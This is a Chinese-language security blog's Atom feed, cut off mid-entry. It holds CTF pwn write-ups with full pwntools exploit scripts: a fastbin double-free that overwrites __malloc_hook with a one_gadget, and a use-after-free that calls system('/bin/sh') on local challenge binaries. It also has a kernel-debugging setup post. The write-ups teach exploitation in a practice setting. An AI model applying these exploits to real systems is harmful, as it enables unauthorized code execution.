<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>foyjog</title>
  
  <subtitle>reversing engineer</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://foyjog.github.io/"/>
  <updated>2018-08-19T13:42:25.085Z</updated>
  <id>https://foyjog.github.io/</id>
  
  <author>
    <name>foyjog</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CVE-2015-3636(pingpong root)</title>
    <link href="https://foyjog.github.io/2018/08/19/CVE-2015-3636-pingpong-root/"/>
    <id>https://foyjog.github.io/2018/08/19/CVE-2015-3636-pingpong-root/</id>
    <published>2018-08-19T13:42:25.000Z</published>
    <updated>2018-08-19T13:42:25.085Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>double free之Fastbin Attack</title>
    <link href="https://foyjog.github.io/2018/08/07/double-free%E4%B9%8BFastbin-Attack/"/>
    <id>https://foyjog.github.io/2018/08/07/double-free之Fastbin-Attack/</id>
    <published>2018-08-07T10:37:56.000Z</published>
    <updated>2018-08-07T11:13:20.568Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>抽时间做了一下安恒杯的第十一周周练,其中的一个fastbin attack还是让我学到了知识,在感概自己太菜的同时,还是要一步一个脚印踏实的走下去.</p><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>pwn题目都很简短,和reverse不一样.<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add_object</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> size; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">size_t</span> v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">void</span> *v2; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( object_count &gt; <span class="number">15</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Enough"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Size:"</span>);</span><br><span class="line">  size = read_choice();</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">128</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  v1 = size;</span><br><span class="line">  v2 = <span class="built_in">malloc</span>(size);</span><br><span class="line">  v3 = object_count++;</span><br><span class="line">  object_array[v3] = v2;</span><br><span class="line">  _printf_chk(<span class="number">1L</span>L, (__int64)<span class="string">"Content &gt;"</span>);</span><br><span class="line">  read(<span class="number">0</span>, v2, v1);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Done"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">puts_object</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rcx</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Index:"</span>);</span><br><span class="line">  v0 = read_choice();</span><br><span class="line">  <span class="keyword">if</span> ( v0 &lt; <span class="number">0</span> || v0 &gt;= object_count )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Invalid Index"</span>);</span><br><span class="line">  v2 = object_array[v0];</span><br><span class="line">  <span class="keyword">return</span> _printf_chk(<span class="number">1L</span>L, (__int64)<span class="string">"Buf[%d]:%s\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete_object</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">void</span> *v1; <span class="comment">// rdi</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Index:"</span>);</span><br><span class="line">  v0 = read_choice();</span><br><span class="line">  <span class="keyword">if</span> ( v0 &gt;= <span class="number">0</span> &amp;&amp; v0 &lt; object_count &amp;&amp; (v1 = (<span class="keyword">void</span> *)object_array[v0]) != <span class="number">0L</span>L )</span><br><span class="line">    <span class="built_in">free</span>(v1);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Invalid Index"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目只有上面的三个功能,从delete_object()可以看到,只对object做了free,没有取消掉bss段中的引用,所以这里造成了一个uaf的漏洞</p><h3 id="泄漏libc地址"><a href="#泄漏libc地址" class="headerlink" title="泄漏libc地址"></a>泄漏libc地址</h3><p>这个利用puts_object()泄漏main arena的top地址即可,和上次的练习是一样的,注意的事情就是第一次的malloc需要128个字节,不然的话被列入fastbin的话就无法泄漏地址了.</p><h3 id="覆盖malloc-hook"><a href="#覆盖malloc-hook" class="headerlink" title="覆盖malloc_hook"></a>覆盖malloc_hook</h3><p>因为题目没有edit功能,所以利用double free的fake trunk感觉使不上劲.所以这里采用fastbin attack来实现对任意地址的读写.</p><ol><li>malloc(1)</li><li>malloc(2)</li><li>free(1)</li><li>free(2)</li><li>free(3)<br>这个时候fastbin就变成了如下状态:<br><img src="/img/fastbinattack1.jpg" alt="fastbin"></li><li>malloc(“fb设置为任意地址”)<br><img src="/img/fastbinattack2.jpg" alt="fastbin"></li><li>malloc()<br><img src="/img/fastbinattack3.jpg" alt="fastbin"></li><li>malloc()<br><img src="/img/fastbinattack4.jpg" alt="fastbin"></li><li>malloc(“任意地址任意写入”)//获得任意地址并写入</li></ol><p>因为我们将malloc_hook改写成了libc中的exec(“bin/sh),所以我们直接调用malloc即可.</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python # encoding: utf-8 </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> context, process, log </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> p64, u64 </span><br><span class="line"><span class="keyword">import</span> pdb</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>, <span class="string">'-p'</span>, <span class="string">'60'</span>] </span><br><span class="line"><span class="comment"># context.log_Level = 'debug' </span></span><br><span class="line">r = process(<span class="string">"./tasty"</span>) </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(size, buf)</span>:</span> </span><br><span class="line">    r.sendlineafter(<span class="string">"&gt;"</span>, <span class="string">"1"</span>) </span><br><span class="line">    r.sendlineafter(<span class="string">"Size:\n&gt;"</span>, <span class="string">"%d"</span> %size) </span><br><span class="line">    r.sendafter(<span class="string">"Content &gt;"</span>, buf) </span><br><span class="line">    r.recvuntil(<span class="string">"Done"</span>) </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, size, buf)</span>:</span> </span><br><span class="line">    r.sendlineafter(<span class="string">"&gt;"</span>, <span class="string">"2"</span>) </span><br><span class="line">    r.sendlineafter(<span class="string">"Index:\n&gt;"</span>, <span class="string">"%d"</span>%idx) </span><br><span class="line">    r. sendlineafter(<span class="string">"New Size &gt;"</span>, <span class="string">"%d"</span>%size) </span><br><span class="line">    r.sendafter(<span class="string">"New Content &gt;"</span>, buf)</span><br><span class="line">    r.recvuntil(<span class="string">"Done"</span>) </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printf</span><span class="params">(idx)</span>:</span> </span><br><span class="line">    r.sendlineafter(<span class="string">"&gt;"</span>, <span class="string">"2"</span>) </span><br><span class="line">    r.sendlineafter(<span class="string">"Index:\n&gt;"</span>, <span class="string">"%d"</span>%idx) </span><br><span class="line">    r.recvuntil(<span class="string">"Buf[%d]:"</span> %idx) </span><br><span class="line">    <span class="keyword">return</span> r.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-1</span>] </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span> </span><br><span class="line">    r.sendlineafter(<span class="string">"&gt;"</span>, <span class="string">"3"</span>) </span><br><span class="line">    r.sendlineafter(<span class="string">"Index:\n&gt;"</span>, <span class="string">"%d"</span>%idx) </span><br><span class="line"></span><br><span class="line">pdb.set_trace() </span><br><span class="line">malloc(<span class="number">0x80</span>, <span class="string">"a"</span> * <span class="number">0x80</span>)</span><br><span class="line">malloc(<span class="number">0x68</span>, <span class="string">"a"</span> * <span class="number">0x68</span>)</span><br><span class="line">malloc(<span class="number">0x68</span>, <span class="string">"a"</span> * <span class="number">0x68</span>) </span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>) </span><br><span class="line">unsorted = u64(printf(<span class="number">0</span>)[<span class="number">-6</span>:] + <span class="string">"\x00\x00"</span>) </span><br><span class="line">log. success(<span class="string">"Ox%x"</span> %unsorted) </span><br><span class="line">__malloc_hook = unsorted - <span class="number">0x68</span> </span><br><span class="line">one_garget = __malloc_hook - <span class="number">0x3c4b10</span> + <span class="number">0xf02a4</span> </span><br><span class="line">free(<span class="number">1</span>) </span><br><span class="line">free(<span class="number">2</span>) </span><br><span class="line">free(<span class="number">1</span>) </span><br><span class="line">malloc(<span class="number">0x68</span>, p64(__malloc_hook<span class="number">-0x13</span>).ljust(<span class="number">0x68</span>))</span><br><span class="line">malloc(<span class="number">0x68</span>, <span class="string">"a"</span> * <span class="number">0x68</span>) </span><br><span class="line">malloc(<span class="number">0x68</span>, <span class="string">"a"</span> * <span class="number">0x68</span>) </span><br><span class="line">payload = <span class="string">"aaa"</span> + p64(one_garget) </span><br><span class="line">malloc(<span class="number">0x68</span>, payload.ljust(<span class="number">0x68</span>, <span class="string">"\x00"</span>)) </span><br><span class="line"></span><br><span class="line">r. sendlineafter(<span class="string">"&gt;"</span>, <span class="string">"1"</span>) </span><br><span class="line">r.sendlineafter(<span class="string">"Size:\n&gt;"</span>, <span class="string">"%d"</span> %<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/heap/fastbin_attack/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/heap/fastbin_attack/</a><br><a href="https://www.linkedbyx.com/forum/group/topic/71" target="_blank" rel="noopener">https://www.linkedbyx.com/forum/group/topic/71</a><br><a href="https://pan.baidu.com/s/1qHzDUPQy59LKlNm3wPgpzA" target="_blank" rel="noopener">https://pan.baidu.com/s/1qHzDUPQy59LKlNm3wPgpzA</a>  密码:s59a</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;抽时间做了一下安恒杯的第十一周周练,其中的一个fastbin attack还是让我学到了知识,在感概自己太菜的同时,还是要一步一个脚印踏实的
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>macOS下利用VMware Fusion进行linux内核调试</title>
    <link href="https://foyjog.github.io/2018/07/30/macOS%E4%B8%8B%E5%88%A9%E7%94%A8VMware-Fusion%E8%BF%9B%E8%A1%8Clinux%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95/"/>
    <id>https://foyjog.github.io/2018/07/30/macOS下利用VMware-Fusion进行linux内核调试/</id>
    <published>2018-07-30T06:45:18.000Z</published>
    <updated>2018-07-30T07:36:44.827Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近两周一直在做内核的fuzz,也没有好好调一下漏洞,有机会偷偷懒还是得调一调,不然手生 啊.</p><h3 id="mac下的调试方式"><a href="#mac下的调试方式" class="headerlink" title="mac下的调试方式"></a>mac下的调试方式</h3><p>刚开始利用了改写vmx下的debugStub.listen.guest64 = “1”设置来进行调试设置,但是gdb一直不能够read到一些内存,而且还不能中断,就很难受,所以改为双机调试.<br>首先参考<a href="http://eternalsakura13.com/2018/04/15/kernel_debug/" target="_blank" rel="noopener">http://eternalsakura13.com/2018/04/15/kernel_debug/</a><br>进行内核的安装和符号文件的拉取,kernel对应的源代码,但是到双机调试的时候就出现问题了,vmwara fusion中没有添加pipe管道这么一个选项.<br>但是其实vmwarefusion是完全支持这么个调试方式的,参考如下如下的文章进行设置:<a href="https://github.com/coolbrain/enviroment-monitoring-system" target="_blank" rel="noopener">https://github.com/coolbrain/enviroment-monitoring-system</a><br>即可成功的进行调试.<br><img src="/img/kdb.png" alt="kdb被调试端"><br><img src="/img/gef.png" alt="gdb调试端"></p><p>利用CVE-2017-8890的poc运行一下.<br><img src="/img/crash.png" alt="crash"><br>可以发现能够正确的跟踪到segment fault.</p><p>如果没有设置好的话多参考参考下面的一些文章即可.</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://insinuator.net/2014/01/serial-port-debugging-between-two-virtual-machines-in-vmware-fusion/" target="_blank" rel="noopener">https://insinuator.net/2014/01/serial-port-debugging-between-two-virtual-machines-in-vmware-fusion/</a><br><a href="https://github.com/coolbrain/enviroment-monitoring-system" target="_blank" rel="noopener">https://github.com/coolbrain/enviroment-monitoring-system</a><br><a href="http://eternalsakura13.com/2018/04/15/kernel_debug/" target="_blank" rel="noopener">http://eternalsakura13.com/2018/04/15/kernel_debug/</a><br><a href="http://bestwing.me/2018/03/23/Linux_Kernel_Debugging_with_VMware_and_GDB/" target="_blank" rel="noopener">http://bestwing.me/2018/03/23/Linux_Kernel_Debugging_with_VMware_and_GDB/</a><br><a href="http://advdbg.org/" target="_blank" rel="noopener">http://advdbg.org/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;最近两周一直在做内核的fuzz,也没有好好调一下漏洞,有机会偷偷懒还是得调一调,不然手生 啊.&lt;/p&gt;
&lt;h3 id=&quot;mac下的调试方式&quot;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>安恒杯第八次周周练writeup</title>
    <link href="https://foyjog.github.io/2018/07/16/%E5%AE%89%E6%81%92%E6%9D%AF%E7%AC%AC%E5%85%AB%E6%AC%A1%E5%91%A8%E5%91%A8%E7%BB%83writeup/"/>
    <id>https://foyjog.github.io/2018/07/16/安恒杯第八次周周练writeup/</id>
    <published>2018-07-16T10:32:37.000Z</published>
    <updated>2018-07-19T03:15:28.446Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>感觉平台对我这种刚入门安全的人来说还是比较友好的,上次的月赛没有时间打,这周末看了一下竟然还有周周练,都是pwn题,所以拿来练练手,让自己多熟悉熟悉pwn类的题目.</p><h3 id="Unote"><a href="#Unote" class="headerlink" title="Unote"></a>Unote</h3><p>是一个32为的程序,checksec如下:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span></span><br></pre></td></tr></table></figure></p><p>拖进ida,程序比较简单,只有四个功能:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">        UNote         </span><br><span class="line">----------------------</span><br><span class="line"> 1. Add note          </span><br><span class="line"> 2. Delete note       </span><br><span class="line"> 3. Print note        </span><br><span class="line"> 4. Exit              </span><br><span class="line">----------------------</span><br></pre></td></tr></table></figure></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __cdecl __<span class="function">noreturn <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+18h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [esp+1Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Please input your username:"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;g_str_name, <span class="number">30u</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      welcome();</span><br><span class="line">      read(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">      v0 = atoi(&amp;buf);</span><br><span class="line">      <span class="keyword">if</span> ( v0 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      delete_note();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v0 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v0 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        print_note();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v0 == <span class="number">4</span> )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">LABEL_13:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Invalid choice"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v0 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      add_note();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>并不用花太多时间了解题目,认真分析分析,就能发现存在uaf的利用点.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.bss:0804A090 ptr             dd ?                    ; DATA XREF: add_note+3C↑r</span><br><span class="line">.bss:0804A090                                         ; add_note+5C↑w ...</span><br><span class="line">.bss:0804A094                 dd ?</span><br><span class="line">.bss:0804A098                 dd ?</span><br></pre></td></tr></table></figure></p><p>ptr数组是bss段,delete_note之后并不会删除ptr数组的引用,所以这里导致了uaf的漏洞所在.<br>整体的exp流程思路如下,比较简单:</p><ol><li>创建两个note</li><li>删除这两个note</li><li>创建第三个note,将其content的大小置为8,所以第三个note的ptr[2]等于ptr[1],ptr[2][1] = ptr[0]</li><li>因为可以控制content,所以将ptr[0]设置为\x72\x86\x04\x08\x70\xa0\x04\x08</li><li>前四个字节为sub_8048672,刚好是system()函数(其实发现这个函数题目的意图就很明显了)</li><li>后四个字节为我们的bss段的g_str_name,我们将其设为/bin/sh即可.</li><li>调用print_note(2),即调用system(“/bin/sh”)</li></ol><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> pdb</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./Unote"</span>)</span><br><span class="line">p = process(<span class="string">"./Unote"</span>)</span><br><span class="line">pdb.set_trace()</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"/bin/sh"</span>)</span><br><span class="line"><span class="comment">#alloc note1</span></span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"135168"</span>)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"/bin/sh"</span>)</span><br><span class="line"><span class="comment">#alloc note2</span></span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"135168"</span>)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"/bin/sh"</span>)</span><br><span class="line"><span class="comment">#delete note1</span></span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"0"</span>)</span><br><span class="line"><span class="comment">#delete note2</span></span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line"><span class="comment">#alloc note3 ,buffer 8 to note1</span></span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"8"</span>)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"\x72\x86\x04\x08\x70\xa0\x04\x08"</span>)<span class="comment">#system to puts</span></span><br><span class="line"><span class="comment">#puts to system</span></span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"3"</span>)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"0"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="over"><a href="#over" class="headerlink" title="over"></a>over</h3><p>这个题目比较少,具体代码和信息如下:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_400676</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">80u</span>LL);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">62</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">96u</span>LL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(&amp;buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span></span><br></pre></td></tr></table></figure><p>很明显的一个栈一处,但是溢出只有16个字节,我们很可能会想到构造rop链,但是16个字节的溢出太少,所以这里利用一个技术叫做Stack Pivot,通过两次leave达到控制esp和ebp的效果.<br>思路如下:</p><ol><li>通过send()79个字节溢出并泄漏ebp的地址.</li><li>计算ebp和buf的offset,通过stack pivot将esp设置为buf的地址.</li><li>开始rop,第一次rop通过puts(puts_got)泄漏puts的libc地址,计算system和字符串/bin/sh地址.</li><li>第二次rop,执行system(“/bin/sh”)</li></ol><h3 id="exp-1"><a href="#exp-1" class="headerlink" 